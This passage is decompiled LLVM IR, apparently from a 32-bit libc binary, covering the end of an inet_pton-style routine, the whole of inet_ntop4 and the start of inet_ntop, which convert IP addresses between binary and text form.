  br i1 %v6_804d371, label %dec_label_pc_804d3ea, label %dec_label_pc_804d373

dec_label_pc_804d373:                             ; preds = %dec_label_pc_804d36a
  %v0_804d373 = load i32, i32* @ebp, align 4
  %v2_804d375 = udiv i32 %v0_804d373, 256
  %v4_804d375 = trunc i32 %v2_804d375 to i8
  %v3_804d378 = inttoptr i32 %v0_804d3b9.pre.pre to i8*
  store i8 %v4_804d375, i8* %v3_804d378, align 1
  %v0_804d37a = load i32, i32* @ebp, align 4
  store i32 %v0_804d37a, i32* %eax.global-to-local, align 4
  %v1_804d37c = trunc i32 %v0_804d37a to i8
  %v2_804d37c = load i32, i32* @ebx, align 4
  %v3_804d37c = add i32 %v2_804d37c, 1
  %v4_804d37c = inttoptr i32 %v3_804d37c to i8*
  store i8 %v1_804d37c, i8* %v4_804d37c, align 1
  %v0_804d37f = load i32, i32* @edx, align 4
  br label %dec_label_pc_804d381

dec_label_pc_804d381:                             ; preds = %dec_label_pc_804d363, %dec_label_pc_804d32c, %dec_label_pc_804d373
  %v0_804d3b9.pre = phi i32 [ %v0_804d337, %dec_label_pc_804d32c ], [ %v0_804d37f, %dec_label_pc_804d373 ], [ %v0_804d3b9.pre.pre, %dec_label_pc_804d363 ]
  %v4_804d381 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_804d381 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_804d381, label %dec_label_pc_804d3b9, label %dec_label_pc_804d388

dec_label_pc_804d388:                             ; preds = %dec_label_pc_804d381
  store i32 1, i32* @esi, align 4
  %v6_804d38f = sub i32 %v0_804d3b9.pre, %v4_804d381
  store i32 %v6_804d38f, i32* @edi, align 4
  %v16_804d393 = icmp eq i32 %v0_804d3b9.pre, %v2_804d26a
  %v1_804d397 = icmp eq i1 %v16_804d393, false
  br i1 %v1_804d397, label %dec_label_pc_804d3b1.preheader, label %dec_label_pc_804d3ea

dec_label_pc_804d3b1.preheader:                   ; preds = %dec_label_pc_804d388
  %v3_804d3b195 = inttoptr i32 %v6_804d38f to i8*
  %v9_804d3b398 = icmp slt i8* %v3_804d3b195, inttoptr (i32 1 to i8*)
  br i1 %v9_804d3b398, label %dec_label_pc_804d3b9.thread, label %dec_label_pc_804d39b

dec_label_pc_804d39b:                             ; preds = %dec_label_pc_804d3b1.preheader, %dec_label_pc_804d39b
  %v0_804d3a9100 = phi i32 [ %v0_804d3b1.pre, %dec_label_pc_804d39b ], [ 1, %dec_label_pc_804d3b1.preheader ]
  %v0_804d39b99 = phi i32 [ %v1_804d3b1.pre, %dec_label_pc_804d39b ], [ %v6_804d38f, %dec_label_pc_804d3b1.preheader ]
  %v2_804d3a1 = sub i32 %v0_804d39b99, %v0_804d3a9100
  %v2_804d3a3 = sub i32 %v2_804d26a, %v0_804d3a9100
  %v6_804d3a5 = add i32 %v2_804d3a1, %v4_804d381
  store i32 %v6_804d3a5, i32* %eax.global-to-local, align 4
  %v1_804d3a9 = add i32 %v0_804d3a9100, 1
  store i32 %v1_804d3a9, i32* @esi, align 4
  %v1_804d3aa = inttoptr i32 %v6_804d3a5 to i8*
  %v2_804d3aa = load i8, i8* %v1_804d3aa, align 1
  %v3_804d3aa = zext i8 %v2_804d3aa to i32
  %v4_804d3aa = load i32, i32* @edx, align 4
  %v5_804d3aa = and i32 %v4_804d3aa, -256
  %v6_804d3aa = or i32 %v5_804d3aa, %v3_804d3aa
  store i32 %v6_804d3aa, i32* @edx, align 4
  %v3_804d3ac = inttoptr i32 %v2_804d3a3 to i8*
  store i8 %v2_804d3aa, i8* %v3_804d3ac, align 1
  %v0_804d3ae = load i32, i32* %eax.global-to-local, align 4
  %v1_804d3ae = inttoptr i32 %v0_804d3ae to i8*
  store i8 0, i8* %v1_804d3ae, align 1
  %v0_804d3b1.pre = load i32, i32* @esi, align 4
  %v1_804d3b1.pre = load i32, i32* @edi, align 4
  %v2_804d3b1 = inttoptr i32 %v0_804d3b1.pre to i8*
  %v3_804d3b1 = inttoptr i32 %v1_804d3b1.pre to i8*
  %v9_804d3b3 = icmp sgt i8* %v2_804d3b1, %v3_804d3b1
  br i1 %v9_804d3b3, label %dec_label_pc_804d3b9.thread, label %dec_label_pc_804d39b

dec_label_pc_804d3b9.thread:                      ; preds = %dec_label_pc_804d39b, %dec_label_pc_804d3b1.preheader
  br label %dec_label_pc_804d3bf

dec_label_pc_804d3b9:                             ; preds = %dec_label_pc_804d381
  %v16_804d3b9 = icmp eq i32 %v0_804d3b9.pre, %v2_804d26a
  %v1_804d3bd = icmp eq i1 %v16_804d3b9, false
  br i1 %v1_804d3bd, label %dec_label_pc_804d3ea, label %dec_label_pc_804d3bf

dec_label_pc_804d3bf:                             ; preds = %dec_label_pc_804d3b9.thread, %dec_label_pc_804d3b9
  store i32 %v2_804d25e, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_804d3cb = call i32 @memcpy(i16* %tmp64, i32 %v2_804d25e, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d3ec

dec_label_pc_804d3da:                             ; preds = %dec_label_pc_804d23e
  %v1_804d3da = call i32 @__errno_location(i32 %v0_804d22d)
  %v1_804d3df = inttoptr i32 %v1_804d3da to i32*
  store i32 97, i32* %v1_804d3df, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d3ec

dec_label_pc_804d3ea:                             ; preds = %dec_label_pc_804d2eb, %dec_label_pc_804d2e2, %dec_label_pc_804d2a6, %dec_label_pc_804d2cd, %dec_label_pc_804d388, %dec_label_pc_804d32c, %dec_label_pc_804d3b9, %dec_label_pc_804d36a, %dec_label_pc_804d31f, %dec_label_pc_804d316, %dec_label_pc_804d279
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d3ec

dec_label_pc_804d3ec:                             ; preds = %dec_label_pc_804d3da, %dec_label_pc_804d3bf, %dec_label_pc_804d249, %dec_label_pc_804d3ea
  %v0_804d3f3 = phi i32 [ -1, %dec_label_pc_804d3da ], [ 1, %dec_label_pc_804d3bf ], [ %v3_804d24f, %dec_label_pc_804d249 ], [ 0, %dec_label_pc_804d3ea ]
  store i32 %v0_804d22d, i32* @ebx, align 4
  store i32 %v0_804d22c, i32* @esi, align 4
  store i32 %v0_804d22b, i32* @edi, align 4
  store i32 %v0_804d22a, i32* @ebp, align 4
  ret i32 %v0_804d3f3

; uselistorder directives
  uselistorder i32 %v1_804d3b1.pre, { 1, 0 }
  uselistorder i32 %v0_804d3b1.pre, { 1, 0 }
  uselistorder i32 %v0_804d3a9100, { 2, 1, 0 }
  uselistorder i32 %v0_804d3b9.pre, { 2, 1, 0 }
  uselistorder i32 %v0_804d3b9.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_804d351, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_804d29e, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_804d26a, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_804d22d, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804d3ec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d3ea, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_804d3bf, { 1, 0 }
  uselistorder label %dec_label_pc_804d39b, { 1, 0 }
  uselistorder label %dec_label_pc_804d381, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d34a, { 1, 0 }
  uselistorder label %dec_label_pc_804d30a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d34a.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_804d3f5 = load i32, i32* @edi, align 4
  %v0_804d3f6 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_804d3fe = load i32, i32* @eax, align 4
  %v3_804d402 = and i32 %v0_804d3fe, -65536
  store i32 %v3_804d402, i32* %stack_var_-33, align 4
  %v2_804d40d = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804d413 = load i32, i32* @edx, align 4
  %v5_804d413 = inttoptr i32 %v0_804d413 to i8*
  store i8* %v5_804d413, i8** %stack_var_-60, align 4
  %v0_804d417 = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_804d41d = add i32 %v2_804d40d, 4
  store i32 %v6_804d41d, i32* %edi.global-to-local, align 4
  %v2_804d41e = inttoptr i32 %v6_804d41d to i32*
  store i32 0, i32* %v2_804d41e, align 4
  %v3_804d41e = load i32, i32* %edi.global-to-local, align 4
  %v6_804d41e = add i32 %v3_804d41e, 4
  store i32 %v6_804d41e, i32* %edi.global-to-local, align 4
  %v0_804d41f = load i32, i32* %eax.global-to-local, align 4
  %v2_804d41f = inttoptr i32 %v6_804d41e to i32*
  store i32 %v0_804d41f, i32* %v2_804d41f, align 4
  %v3_804d41f = load i32, i32* %edi.global-to-local, align 4
  %v6_804d41f = add i32 %v3_804d41f, 4
  store i32 %v6_804d41f, i32* %edi.global-to-local, align 4
  %v0_804d420 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d420 = trunc i32 %v0_804d420 to i16
  %v3_804d420 = inttoptr i32 %v6_804d41f to i16*
  store i16 %v1_804d420, i16* %v3_804d420, align 2
  %v4_804d420 = load i32, i32* %edi.global-to-local, align 4
  %v7_804d420 = add i32 %v4_804d420, 2
  store i32 %v7_804d420, i32* %edi.global-to-local, align 4
  %v0_804d422 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d422 = trunc i32 %v0_804d422 to i8
  %v3_804d422 = inttoptr i32 %v7_804d420 to i8*
  store i8 %v1_804d422, i8* %v3_804d422, align 1
  %v0_804d4b226 = load i32, i32* %ebp.global-to-local, align 4
  %v7_804d4b529 = icmp sgt i32 %v0_804d4b226, 3
  br i1 %v7_804d4b529, label %dec_label_pc_804d4bb, label %dec_label_pc_804d428

dec_label_pc_804d428:                             ; preds = %entry, %dec_label_pc_804d490
  %v0_804d4b230 = phi i32 [ %v0_804d4b2, %dec_label_pc_804d490 ], [ %v0_804d4b226, %entry ]
  %v0_804d42c = load i32, i32* @ecx, align 4
  %v1_804d42c = and i32 %v0_804d42c, -256
  %v2_804d42c = or i32 %v1_804d42c, 100
  store i32 %v2_804d42c, i32* %ecx.global-to-local, align 4
  %v2_804d42e = add i32 %v0_804d4b230, %v0_804d3fe
  store i32 %v2_804d42e, i32* %eax.global-to-local, align 4
  %v0_804d430 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d430 = add i32 %v0_804d430, 1
  store i32 %v1_804d430, i32* @esi, align 4
  store i32 %v0_804d430, i32* @edi, align 4
  %v1_804d439 = inttoptr i32 %v2_804d42e to i8*
  %v2_804d439 = load i8, i8* %v1_804d439, align 1
  %v3_804d439 = zext i8 %v2_804d439 to i32
  %v4_804d439 = load i32, i32* @edx, align 4
  %v5_804d439 = and i32 %v4_804d439, -65536
  %v6_804d439 = or i32 %v5_804d439, %v3_804d439
  store i32 %v6_804d439, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_804d439, 100
  %v6_804d43f = zext i8 %div to i32
  %v4_804d441 = or i32 %v6_804d43f, %v1_804d42c
  store i32 %v4_804d441, i32* %ecx.global-to-local, align 4
  %v1_804d443 = or i32 %v4_804d441, 48
  store i32 %v1_804d443, i32* %eax.global-to-local, align 4
  %v1_804d446 = trunc i32 %v1_804d443 to i8
  %v2_804d446 = load i32, i32* @esp, align 4
  %v4_804d446 = add i32 %v0_804d430, 43
  %v5_804d446 = add i32 %v4_804d446, %v2_804d446
  %v6_804d446 = inttoptr i32 %v5_804d446 to i8*
  store i8 %v1_804d446, i8* %v6_804d446, align 1
  %v0_804d44a = load i32, i32* %eax.global-to-local, align 4
  %v1_804d44a = trunc i32 %v0_804d44a to i8
  %v7_804d44a = icmp eq i8 %v1_804d44a, 48
  %v1_804d44c = icmp eq i1 %v7_804d44a, false
  %v0_804d472 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d472 = and i32 %v0_804d472, -256
  %v2_804d472 = or i32 %v1_804d472, 10
  store i32 %v2_804d472, i32* %ecx.global-to-local, align 4
  %v0_804d474 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804d474, i32* %eax.global-to-local, align 4
  %v3_804d476 = trunc i32 %v0_804d474 to i16
  %v5_804d476 = udiv i16 %v3_804d476, 10
  br i1 %v1_804d44c, label %dec_label_pc_804d472, label %dec_label_pc_804d44e

dec_label_pc_804d44e:                             ; preds = %dec_label_pc_804d428
  %v9_804d452 = and i32 %v0_804d474, -65536
  %tmp = urem i16 %v5_804d476, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div32 = udiv i16 %tmp, 10
  %v7_804d45f = zext i16 %div32 to i32
  %v11_804d45f = or i32 %v7_804d45f, %v9_804d452
  store i32 %v11_804d45f, i32* %eax.global-to-local, align 4
  %tmp34 = urem i16 %tmp, 10
  %v12_804d45f = zext i16 %tmp34 to i32
  %v1_804d462 = or i32 %v12_804d45f, 48
  %v8_804d462 = trunc i32 %v1_804d462 to i8
  store i32 %v1_804d462, i32* %edx.global-to-local, align 4
  %v2_804d465 = load i32, i32* @esp, align 4
  %v3_804d465 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804d465 = add i32 %v2_804d465, 43
  %v5_804d465 = add i32 %v4_804d465, %v3_804d465
  %v6_804d465 = inttoptr i32 %v5_804d465 to i8*
  store i8 %v8_804d462, i8* %v6_804d465, align 1
  %v0_804d469 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d469 = trunc i32 %v0_804d469 to i8
  %v7_804d469 = icmp eq i8 %v1_804d469, 48
  br i1 %v7_804d469, label %dec_label_pc_804d490, label %dec_label_pc_804d46e

dec_label_pc_804d46e:                             ; preds = %dec_label_pc_804d44e
  %v0_804d46e = load i32, i32* @esi, align 4
  store i32 %v0_804d46e, i32* @edi, align 4
  br label %dec_label_pc_804d490

dec_label_pc_804d472:                             ; preds = %dec_label_pc_804d428
  %tmp35 = urem i16 %v5_804d476, 256
  %v3_804d478 = and i32 %v0_804d474, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div33 = udiv i16 %tmp35, 10
  %v7_804d483 = zext i16 %div33 to i32
  %v11_804d483 = or i32 %v7_804d483, %v3_804d478
  store i32 %v11_804d483, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp35, 10
  %v12_804d483 = zext i16 %tmp36 to i32
  %v1_804d486 = or i32 %v12_804d483, 48
  %v8_804d486 = trunc i32 %v1_804d486 to i8
  store i32 %v1_804d486, i32* %edx.global-to-local, align 4
  %v0_804d489 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d489 = add i32 %v0_804d489, 2
  store i32 %v1_804d489, i32* @edi, align 4
  %v2_804d48c = load i32, i32* @esp, align 4
  %v3_804d48c = load i32, i32* @esi, align 4
  %v4_804d48c = add i32 %v2_804d48c, 43
  %v5_804d48c = add i32 %v4_804d48c, %v3_804d48c
  %v6_804d48c = inttoptr i32 %v5_804d48c to i8*
  store i8 %v8_804d486, i8* %v6_804d48c, align 1
  br label %dec_label_pc_804d490

dec_label_pc_804d490:                             ; preds = %dec_label_pc_804d44e, %dec_label_pc_804d46e, %dec_label_pc_804d472
  store i32 %v2_804d42e, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_804d499 = load i32, i32* @edi, align 4
  %v1_804d499 = add i32 %v0_804d499, 2
  store i32 %v1_804d499, i32* %ebx.global-to-local, align 4
  %v0_804d49c = load i32, i32* %ebp.global-to-local, align 4
  %v1_804d49c = add i32 %v0_804d49c, 1
  store i32 %v1_804d49c, i32* %ebp.global-to-local, align 4
  %v2_804d49d = load i8, i8* %v1_804d439, align 1
  %v3_804d49d = zext i8 %v2_804d49d to i32
  %v4_804d49d = load i32, i32* %eax.global-to-local, align 4
  %v5_804d49d = and i32 %v4_804d49d, -65536
  %v6_804d49d = or i32 %v5_804d49d, %v3_804d49d
  store i32 %v6_804d49d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804d4a3 = load i32, i32* @esp, align 4
  %v2_804d4a3 = add i32 %v0_804d499, 44
  %v3_804d4a3 = add i32 %v2_804d4a3, %v0_804d4a3
  %v4_804d4a3 = inttoptr i32 %v3_804d4a3 to i8*
  store i8 46, i8* %v4_804d4a3, align 1
  %v0_804d4a8 = load i32, i32* @ecx, align 4
  %v1_804d4a8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d4a8 = urem i32 %v1_804d4a8, 65536
  %v3_804d4a8 = load i32, i32* %edx.global-to-local, align 4
  %v4_804d4a8 = mul i32 %v3_804d4a8, 65536
  %v5_804d4a8 = or i32 %v4_804d4a8, %v2_804d4a8
  %v6_804d4a8 = urem i32 %v0_804d4a8, 65536
  %v7_804d4a8 = udiv i32 %v5_804d4a8, %v6_804d4a8
  %v8_804d4a8 = urem i32 %v7_804d4a8, 65536
  %v10_804d4a8 = and i32 %v1_804d4a8, -65536
  %v11_804d4a8 = or i32 %v8_804d4a8, %v10_804d4a8
  store i32 %v11_804d4a8, i32* %eax.global-to-local, align 4
  %v12_804d4a8 = urem i32 %v5_804d4a8, %v6_804d4a8
  %v14_804d4a8 = and i32 %v3_804d4a8, -65536
  %v15_804d4a8 = or i32 %v12_804d4a8, %v14_804d4a8
  %v1_804d4ab = add i32 %v15_804d4a8, 48
  %v8_804d4ab = trunc i32 %v1_804d4ab to i8
  store i32 %v1_804d4ab, i32* @edx, align 4
  %v2_804d4ae = load i32, i32* @esp, align 4
  %v3_804d4ae = load i32, i32* @edi, align 4
  %v4_804d4ae = add i32 %v2_804d4ae, 43
  %v5_804d4ae = add i32 %v4_804d4ae, %v3_804d4ae
  %v6_804d4ae = inttoptr i32 %v5_804d4ae to i8*
  store i8 %v8_804d4ab, i8* %v6_804d4ae, align 1
  %v0_804d4b2 = load i32, i32* %ebp.global-to-local, align 4
  %v7_804d4b5 = icmp sgt i32 %v0_804d4b2, 3
  br i1 %v7_804d4b5, label %dec_label_pc_804d4bb, label %dec_label_pc_804d428

dec_label_pc_804d4bb:                             ; preds = %dec_label_pc_804d490, %entry
  %v0_804d4bb = load i32, i32* @esp, align 4
  %v1_804d4bb = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d4bb = add i32 %v0_804d4bb, 42
  %v3_804d4bb = add i32 %v2_804d4bb, %v1_804d4bb
  %v4_804d4bb = inttoptr i32 %v3_804d4bb to i8*
  store i8 0, i8* %v4_804d4bb, align 1
  %v2_804d4c3 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_804d4c3, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_804d4c8 = call i32 @strlen(i8* %tmp23)
  store i32 %v3_804d4c8, i32* @eax, align 4
  %tmp31 = icmp ugt i32 %v3_804d4c8, %v0_804d417
  br i1 %tmp31, label %dec_label_pc_804d4d6, label %dec_label_pc_804d4e5

dec_label_pc_804d4d6:                             ; preds = %dec_label_pc_804d4bb
  %v0_804d4d6 = load i8*, i8** %stack_var_-92, align 4
  %v1_804d4d6 = ptrtoint i8* %v0_804d4d6 to i32
  %v2_804d4d6 = call i32 @__errno_location(i32 %v1_804d4d6)
  %v1_804d4db = inttoptr i32 %v2_804d4d6 to i32*
  store i32 28, i32* %v1_804d4db, align 4
  br label %dec_label_pc_804d4f4

dec_label_pc_804d4e5:                             ; preds = %dec_label_pc_804d4bb
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_804d4e85 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_804d4e85, i32* %tmp25, align 4
  %v0_804d4ec.cast = inttoptr i32 %v3_804d4e85 to i8*
  %v4_804d4ec = call i32 @strcpy(i8* %v0_804d4ec.cast, i32 %v2_804d4c3)
  br label %dec_label_pc_804d4f4

dec_label_pc_804d4f4:                             ; preds = %dec_label_pc_804d4d6, %dec_label_pc_804d4e5
  %storemerge = phi i32 [ %v4_804d4ec, %dec_label_pc_804d4e5 ], [ 0, %dec_label_pc_804d4d6 ]
  %v0_804d4fb = phi i32 [ %v4_804d4ec, %dec_label_pc_804d4e5 ], [ 0, %dec_label_pc_804d4d6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804d3f6, i32* @esi, align 4
  store i32 %v0_804d3f5, i32* @edi, align 4
  ret i32 %v0_804d4fb

; uselistorder directives
  uselistorder i32 %v0_804d4b2, { 1, 0 }
  uselistorder i32 %v3_804d4a8, { 1, 0 }
  uselistorder i32 %v1_804d4a8, { 1, 0 }
  uselistorder i32 %v1_804d486, { 1, 0 }
  uselistorder i32 %v1_804d462, { 1, 0 }
  uselistorder i32 %v0_804d474, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804d443, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i1* @df, { 4, 10, 11, 0, 1, 12, 13, 18, 19, 7, 2, 3, 5, 6, 8, 9, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_804d4f4, { 1, 0 }
  uselistorder label %dec_label_pc_804d490, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d428, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_804d4fd = load i32, i32* @edi, align 4
  %v0_804d4fe = load i32, i32* @esi, align 4
  %v0_804d4ff = load i32, i32* @ebx, align 4
  %v15_804d500 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_804d507 = icmp eq i32 %arg1, 2
  br i1 %v9_804d507, label %dec_label_pc_804d517, label %dec_label_pc_804d50c

dec_label_pc_804d50c:                             ; preds = %entry
  %v9_804d50c = icmp eq i32 %arg1, 10
  %v1_804d50f = icmp eq i1 %v9_804d50c, false
  br i1 %v1_804d50f, label %dec_label_pc_804d6b3, label %dec_label_pc_804d52f

dec_label_pc_804d517:                             ; preds = %entry
  %v4_804d517 = ptrtoint i8* %arg3 to i32
  store i32 %v4_804d517, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_804d523 = call i32 @inet_ntop4(i32 %v0_804d4ff, i32 %v0_804d4fe, i32 %v0_804d4fd)
  store i32 %v3_804d523, i32* %eax.global-to-local, align 4
  store i32 %v3_804d523, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d6c0

dec_label_pc_804d52f:                             ; preds = %dec_label_pc_804d50c
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_804d534 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804d534, i32* %eax.global-to-local, align 4
  %tmp44 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp44, i8** %stack_var_-124, align 4
  %v6_804d539 = call i32 @__GI_memset(i8* %tmp44, i32 0, i32 32)
  store i32 %v6_804d539, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_804d55b = add i32 %arg2, 1
  br label %dec_label_pc_804d545

dec_label_pc_804d545:                             ; preds = %dec_label_pc_804d545.dec_label_pc_804d545_crit_edge, %dec_label_pc_804d52f
  %v1_804d568 = phi i32 [ %v15_804d500, %dec_label_pc_804d52f ], [ %v1_804d568.pre, %dec_label_pc_804d545.dec_label_pc_804d545_crit_edge ]
  %v0_804d56373 = phi i32 [ 0, %dec_label_pc_804d52f ], [ %v0_804d56c.pre, %dec_label_pc_804d545.dec_label_pc_804d545_crit_edge ]
  %v1_804d54e = ashr i32 %v0_804d56373, 31
  %v2_804d54f = zext i32 %v0_804d56373 to i64
  %v4_804d54f = zext i32 %v1_804d54e to i64
  %v5_804d54f = mul nuw i64 %v4_804d54f, 4294967296
  %v6_804d54f = or i64 %v5_804d54f, %v2_804d54f
  %v8_804d54f = sdiv i64 %v6_804d54f, 2
  %v9_804d54f = trunc i64 %v8_804d54f to i32
  store i32 %v9_804d54f, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_804d54f, i32* %ebx.global-to-local, align 4
  %v2_804d557 = add i32 %v0_804d56373, %arg2
  %v3_804d557 = inttoptr i32 %v2_804d557 to i8*
  %v4_804d557 = load i8, i8* %v3_804d557, align 1
  %v5_804d557 = zext i8 %v4_804d557 to i32
  store i32 %v5_804d557, i32* %eax.global-to-local, align 4
  %v3_804d55b = add i32 %v2_804d55b, %v0_804d56373
  %v4_804d55b = inttoptr i32 %v3_804d55b to i8*
  %v5_804d55b = load i8, i8* %v4_804d55b, align 1
  %v6_804d55b = zext i8 %v5_804d55b to i32
  store i32 %v6_804d55b, i32* %edx.global-to-local, align 4
  %v2_804d560 = mul nuw nsw i32 %v5_804d557, 256
  %v1_804d563 = add i32 %v0_804d56373, 2
  store i32 %v1_804d563, i32* %ecx.global-to-local, align 4
  %v2_804d566 = or i32 %v6_804d55b, %v2_804d560
  store i32 %v2_804d566, i32* %eax.global-to-local, align 4
  %v3_804d568 = mul i32 %v9_804d54f, 4
  %v4_804d568 = add i32 %v3_804d568, 60
  %v5_804d568 = add i32 %v4_804d568, %v1_804d568
  %v6_804d568 = inttoptr i32 %v5_804d568 to i32*
  store i32 %v2_804d566, i32* %v6_804d568, align 4
  %v0_804d56c.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_804d56f = icmp sgt i32 %v0_804d56c.pre, 15
  br i1 %v7_804d56f, label %dec_label_pc_804d571, label %dec_label_pc_804d545.dec_label_pc_804d545_crit_edge

dec_label_pc_804d545.dec_label_pc_804d545_crit_edge: ; preds = %dec_label_pc_804d545
  %v1_804d568.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d545

dec_label_pc_804d571:                             ; preds = %dec_label_pc_804d545
  %v4_804d52f = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804d57b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d57b

dec_label_pc_804d57b:                             ; preds = %dec_label_pc_804d571, %dec_label_pc_804d5a8
  %v0_804d5a872 = phi i32 [ 0, %dec_label_pc_804d571 ], [ %v1_804d5a8, %dec_label_pc_804d5a8 ]
  %v0_804d59371 = phi i32 [ -1, %dec_label_pc_804d571 ], [ %v0_804d5939, %dec_label_pc_804d5a8 ]
  %v0_804d5b370 = phi i32 [ -1, %dec_label_pc_804d571 ], [ %v0_804d59810, %dec_label_pc_804d5a8 ]
  %v0_804d5be69 = phi i32 [ -1, %dec_label_pc_804d571 ], [ %v0_804d5a314, %dec_label_pc_804d5a8 ]
  %v2_804d57b = mul nuw nsw i32 %v0_804d5a872, 4
  %v3_804d57b = add nuw nsw i32 %v2_804d57b, 60
  %v4_804d57b = add i32 %v3_804d57b, %v0_804d57b.pre
  %v5_804d57b = inttoptr i32 %v4_804d57b to i32*
  %v6_804d57b = load i32, i32* %v5_804d57b, align 4
  %v7_804d57b = icmp eq i32 %v6_804d57b, 0
  %v1_804d580 = icmp eq i1 %v7_804d57b, false
  %v10_804d593 = icmp eq i32 %v0_804d59371, -1
  br i1 %v1_804d580, label %dec_label_pc_804d593, label %dec_label_pc_804d582

dec_label_pc_804d582:                             ; preds = %dec_label_pc_804d57b
